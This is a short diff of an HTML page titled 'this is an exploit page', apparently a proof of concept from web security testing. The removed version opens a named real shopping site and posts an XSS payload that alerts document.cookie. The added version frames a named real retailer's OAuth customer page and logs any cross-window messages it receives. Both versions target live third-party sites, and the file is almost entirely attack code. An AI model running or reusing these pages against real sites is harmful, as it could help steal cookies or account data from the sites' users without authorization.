@@ -4,15 +4,12 @@
   <title>this is an exploit page</title>
 </head>
 <body>
-  <script>
-    var victim = window.open("https://www.socialdeal.nl/");
+  <iframe src="https://www.boozt.com/eu/en/customer?oauth=1"></iframe>
+<script>
+    window.addEventListener("message", function(e) {
+    console.log("Received message:", e.data);
+});
     
-    setTimeout(function(){
-      victim.postMessage(
-        {action:"<script>alert(document.cookie)</script>"},
-        "https://www.socialdeal.nl/"
-         );
-      }, 3000);
     </script>
 </body>
 </html>
